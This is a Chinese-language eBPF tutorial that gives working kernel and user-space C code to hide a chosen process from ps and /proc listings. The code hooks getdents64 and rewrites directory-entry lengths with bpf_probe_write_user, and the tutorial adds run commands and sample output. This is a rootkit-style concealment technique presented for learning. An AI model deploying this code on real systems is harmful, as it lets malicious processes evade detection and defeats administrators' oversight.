# eBPF 开发实践：使用 eBPF 隐藏进程或文件信息

eBPF（扩展的伯克利数据包过滤器）是 Linux 内核中的一个强大功能，可以在无需更改内核源代码或重启内核的情况下，运行、加载和更新用户定义的代码。这种功能让 eBPF 在网络和系统性能分析、数据包过滤、安全策略等方面有了广泛的应用。

在本篇教程中，我们将展示如何利用 eBPF 来隐藏进程或文件信息，这是网络安全和防御领域中一种常见的技术。

## 背景知识与实现机制

"进程隐藏" 能让特定的进程对操作系统的常规检测机制变得不可见。在黑客攻击或系统防御的场景中，这种技术都可能被应用。具体来说，Linux 系统中每个进程都在 /proc/ 目录下有一个以其进程 ID 命名的子文件夹，包含了该进程的各种信息。`ps` 命令就是通过查找这些文件夹来显示进程信息的。因此，如果我们能隐藏某个进程的 /proc/ 文件夹，就能让这个进程对 `ps` 命令等检测手段“隐身”。

要实现进程隐藏，关键在于操作 `/proc/` 目录。在 Linux 中，`getdents64` 系统调用可以读取目录下的文件信息。我们可以通过挂接这个系统调用，修改它返回的结果，从而达到隐藏文件的目的。实现这个功能需要使用到 eBPF 的 `bpf_probe_write_user` 功能，它可以修改用户空间的内存，因此能用来修改 `getdents64` 返回的结果。

下面，我们会详细介绍如何在内核态和用户态编写 eBPF 程序来实现进程隐藏。

### 内核态 eBPF 程序实现

接下来，我们将详细介绍如何在内核态编写 eBPF 程序来实现进程隐藏。首先是 eBPF 程序的起始部分：

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");
```

我们首先需要理解这个 eBPF 程序的基本构成和使用到的几个重要组件。前几行引用了几个重要的头文件，如 "vmlinux.h"、"bpf_helpers.h"、"bpf_tracing.h" 和 "bpf_core_read.h"。这些文件提供了 eBPF 编程所需的基础设施和一些重要的函数或宏。

- "vmlinux.h" 是一个包含了完整的内核数据结构的头文件，是从 vmlinux 内核二进制中提取的。使用这个头文件，eBPF 程序可以访问内核的数据结构。
- "bpf_helpers.h" 头文件中定义了一系列的宏，这些宏是 eBPF 程序使用的 BPF 助手（helper）函数的封装。这些 BPF 助手函数是 eBPF 程序和内核交互的主要方式。
- "bpf_tracing.h" 是用于跟踪事件的头文件，它包含了许多宏和函数，这些都是为了简化 eBPF 程序对跟踪点（tracepoint）的操作。
- "bpf_core_read.h" 头文件提供了一组用于从内核读取数据的宏和函数。

程序中定义了一系列的 map 结构，这些 map 是 eBPF 程序中的主要数据结构，它们用于在内核态和用户态之间共享数据，或者在 eBPF 程序中存储和传递数据。

其中，"rb" 是一个 Ringbuffer 类型的 map，它用于从内核向用户态传递消息。Ringbuffer 是一种能在内核和用户态之间高效传递大量数据的数据结构。

"map_buffs" 是一个 Hash 类型的 map，它用于存储目录项（dentry）的缓冲区地址。

"map_bytes_read" 是另一个 Hash 类型的 map，它用于在数据循环中启用搜索。

"map_to_patch" 是另一个 Hash 类型的 map，存储了需要被修改的目录项（dentry）的地址。

"map_prog_array" 是一个 Prog Array 类型的 map，它用于保存程序的尾部调用。

程序中的 "target_ppid" 和 "pid_to_hide_len"、"pid_to_hide" 是几个重要的全局变量，它们分别存储了目标父进程的 PID、需要隐藏的 PID 的长度以及需要隐藏的 PID。

接下来的代码部分，程序定义了一个名为 "linux_dirent64" 的结构体，这个结构体代表一个 Linux 目录项。然后程序定义了两个函数，"handle_getdents_enter" 和 "handle_getdents_exit"，这两个函数分别在 getdents64 系统调用的入口和出口被调用，用于实现对目录项的操作。

```c

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the string representation
// of the PID to hide. This becomes the name
// of the folder in /proc/
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN];

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ }; 
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}
```

在这部分代码中，我们可以看到 eBPF 程序的一部分具体实现，该程序负责在 `getdents64` 系统调用的入口处进行处理。

我们首先声明了几个全局的变量。其中 `target_ppid` 代表我们要关注的目标父进程的 PID。如果这个值为 0，那么我们将关注所有的进程。`pid_to_hide_len` 和 `pid_to_hide` 则分别用来存储我们要隐藏的进程的 PID 的长度和 PID 本身。这个 PID 会转化成 `/proc/` 目录下的一个文件夹的名称，因此被隐藏的进程在 `/proc/` 目录下将无法被看到。

接下来，我们声明了一个名为 `linux_dirent64` 的结构体。这个结构体代表一个 Linux 目录项，包含了一些元数据，如 inode 号、下一个目录项的偏移、当前目录项的长度、文件类型以及文件名。

然后是 `getdents64` 函数的原型。这个函数是 Linux 系统调用，用于读取一个目录的内容。我们的目标就是在这个函数执行的过程中，对目录项进行修改，以实现进程隐藏。

随后的部分是 eBPF 程序的具体实现。我们在 `getdents64` 系统调用的入口处定义了一个名为 `handle_getdents_enter` 的函数。这个函数首先获取了当前进程的 PID 和线程组 ID，然后检查这个进程是否是我们关注的进程。如果我们设置了 `target_ppid`，那么我们就只关注那些父进程的 PID 为 `target_ppid` 的进程。如果 `target_ppid` 为 0，我们就关注所有进程。

在确认了当前进程是我们关注的进程之后，我们将 `getdents64` 系统调用的参数保存到一个 map 中，以便在系统调用返回时使用。我们特别关注 `getdents64` 系统调用的第二个参数，它是一个指向 `linux_dirent64` 结构体的指针，代表了系统调用要读取的目录的内容。我们将这个指针以及当前的 PID 和线程组 ID 作为键值对保存到 `map_buffs` 这个 map 中。

至此，我们完成了 `getdents64` 系统调用入口处的处理。在系统调用返回时，我们将会在 `handle_getdents_exit` 函数中，对目录项进行修改，以实现进程隐藏。

在接下来的代码段中，我们将要实现在 `getdents64` 系统调用返回时的处理。我们主要的目标就是找到我们想要隐藏的进程，并且对目录项进行修改以实现隐藏。

我们首先定义了一个名为 `handle_getdents_exit` 的函数，它将在 `getdents64` 系统调用返回时被调用。

```c

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // All of this is quite complex, but basically boils down to
    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
    // patching
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i ++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr+bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++) {
            if (filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        if (j == pid_to_hide_len) {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

```

在这个函数中，我们首先获取了当前进程的 PID 和线程组 ID，然后检查系统调用是否读取到了目录的内容。如果没有读取到内容，我们就直接返回。

然后我们从 `map_buffs` 这个 map 中获取 `getdents64` 系统调用入口处保存的目录内容的地址。如果我们没有保存过这个地址，那么就没有必要进行进一步的处理。

接下来的部分有点复杂，我们用了一个循环来迭代读取目录的内容，并且检查是否有我们想要隐藏的进程的 PID。如果我们找到了，我们就用 `bpf_tail_call` 函数跳转到 `handle_getdents_patch` 函数，进行实际的隐藏操作。

```c
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}

```

在 `handle_getdents_patch` 函数中，我们首先检查我们是否已经找到了我们想要隐藏的进程的 PID。然后我们读取目录项的内容，并且修改 `d_reclen` 字段，让它覆盖下一个目录项，这样就可以隐藏我们的目标进程了。

在这个过程中，我们用到了 `bpf_probe_read_user`、`bpf_probe_read_user_str`、`bpf_probe_write_user` 这几个函数来读取和写入用户空间的数据。这是因为在内核空间，我们不能直接访问用户空间的数据，必须使用这些特殊的函数。

在我们完成隐藏操作后，我们会向一个名为 `rb` 的环形缓冲区发送一个事件，表示我们已经成功地隐藏了一个进程。我们用 `bpf_ringbuf_reserve` 函数来预留缓冲区空间，然后将事件的数据填充到这个空间，并最后用 `bpf_ringbuf_submit` 函数将事件提交到缓冲区。

最后，我们清理了之前保存在 map 中的数据，并返回。

这段代码是在 eBPF 环境下实现进程隐藏的一个很好的例子。通过这个例子，我们可以看到 eBPF 提供的丰富的功能，如系统调用跟踪、map 存储、用户空间数据访问、尾调用等。这些功能使得我们能够在内核空间实现复杂的逻辑，而不需要修改内核代码。

## 用户态 eBPF 程序实现

我们在用户态的 eBPF 程序中主要进行了以下几个操作：

1. 打开 eBPF 程序。
2. 设置我们想要隐藏的进程的 PID。
3. 验证并加载 eBPF 程序。
4. 等待并处理由 eBPF 程序发送的事件。

首先，我们打开了 eBPF 程序。这个过程是通过调用 `pidhide_bpf__open` 函数实现的。如果这个过程失败了，我们就直接返回。

```c
    skel = pidhide_bpf__open();
    if (!skel)
    {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }
```

接下来，我们设置了我们想要隐藏的进程的 PID。这个过程是通过将 PID 保存到 eBPF 程序的 `rodata` 区域实现的。默认情况下，我们隐藏的是当前进程。

```c
    char pid_to_hide[10];
    if (env.pid_to_hide == 0)
    {
        env.pid_to_hide = getpid();
    }
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
    skel->rodata->target_ppid = env.target_ppid;
```

然后，我们验证并加载 eBPF 程序。这个过程是通过调用 `pidhide_bpf__load` 函数实现的。如果这个过程失败了，我们就进行清理操作。

```c
    err = pidhide_bpf__load(skel);
    if (err)
    {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
```

最后，我们等待并处理由 eBPF 程序发送的事件。这个过程是通过调用 `ring_buffer__poll` 函数实现的。在这个过程中，我们每隔一段时间就检查一次环形缓冲区中是否有新的事件。如果有，我们就调用 `handle_event` 函数来处理这个事件。

```c
printf("Successfully started!\n");
printf("Hiding PID %d\n", env.pid_to_hide);
while (!exiting)
{
    err = ring_buffer__poll(rb, 100 /* timeout, ms */);
    /* Ctrl-C will cause -EINTR */
    if (err == -EINTR)
    {
        err = 0;
        break;
    }
    if (err < 0)
    {
        printf("Error polling perf buffer: %d\n", err);
        break;
    }
}
```

`handle_event` 函数中，我们根据事件的内容打印了相应的消息。这个函数的参数包括一个上下文，事件的数据，以及数据的大小。我们首先将事件的数据转换为 `event` 结构体，然后根据 `success` 字段判断这个事件是否表示成功隐藏了一个进程，最后打

印相应的消息。

```c
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}
```

这段代码展示了如何在用户态使用 eBPF 程序来实现进程隐藏的功能。我们首先打开 eBPF 程序，然后设置我们想要隐藏的进程的 PID，再验证并加载 eBPF 程序，最后等待并处理由 eBPF 程序发送的事件。这个过程中，我们使用了 eBPF 提供的一些高级功能，如环形缓冲区和事件处理，这些功能使得我们能够在用户态方便地与内核态的 eBPF 程序进行交互。

完整源代码：<https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/24-hide>

> 本文所示技术仅为概念验证，仅供学习使用，严禁用于不符合法律法规要求的场景。

## 编译运行，隐藏 PID

首先，我们需要编译 eBPF 程序：

```bash
make
```

然后，假设我们想要隐藏进程 ID 为 1534 的进程，可以运行如下命令：

```sh
sudo ./pidhide --pid-to-hide 1534
```

这条命令将使所有尝试读取 `/proc/` 目录的操作都无法看到 PID 为 1534 的进程。例如，我们可以选择一个进程进行隐藏：

```console
$ ps -aux | grep 1534
yunwei      1534  0.0  0.0 244540  6848 ?        Ssl  6月02   0:00 /usr/libexec/gvfs-mtp-volume-monitor
yunwei     32065  0.0  0.0  17712  2580 pts/1    S+   05:43   0:00 grep --color=auto 1534
```

此时通过 ps 命令可以看到进程 ID 为 1534 的进程。但是，如果我们运行 `sudo ./pidhide --pid-to-hide 1534`，再次运行 `ps -aux | grep 1534`，就会发现进程 ID 为 1534 的进程已经不见了。

```console
$ sudo ./pidhide --pid-to-hide 1534
Hiding PID 1534
Hid PID from program 31529 (ps)
Hid PID from program 31551 (ps)
Hid PID from program 31560 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31585 (bash)
Hid PID from program 31585 (bash)
Hid PID from program 31609 (bash)
Hid PID from program 31640 (ps)
Hid PID from program 31649 (ps)
```

这个程序将匹配这个 pid 的进程隐藏，使得像 `ps` 这样的工具无法看到，我们可以通过 `ps aux | grep 1534` 来验证。

```console
$ ps -aux | grep 1534
root       31523  0.1  0.0  22004  5616 pts/2    S+   05:42   0:00 sudo ./pidhide -p 1534
root       31524  0.0  0.0  22004   812 pts/3    Ss   05:42   0:00 sudo ./pidhide -p 1534
root       31525  0.3  0.0   3808  2456 pts/3    S+   05:42   0:00 ./pidhide -p 1534
yunwei     31583  0.0  0.0  17712  2612 pts/1    S+   05:42   0:00 grep --color=auto 1534
```

## 总结

通过本篇 eBPF 入门实践教程，我们深入了解了如何使用 eBPF 来隐藏进程或文件信息。我们学习了如何编写和加载 eBPF 程序，如何通过 eBPF 拦截系统调用并修改它们的行为，以及如何将这些知识应用到实际的网络安全和防御工作中。此外，我们也了解了 eBPF 的强大性，尤其是它能在不需要修改内核源代码或重启内核的情况下，允许用户在内核中执行自定义代码的能力。

您还可以访问我们的教程代码仓库 <https://github.com/eunomia-bpf/bpf-developer-tutorial> 或网站 <https://eunomia.dev/zh/tutorials/> 以获取更多示例和完整的教程。
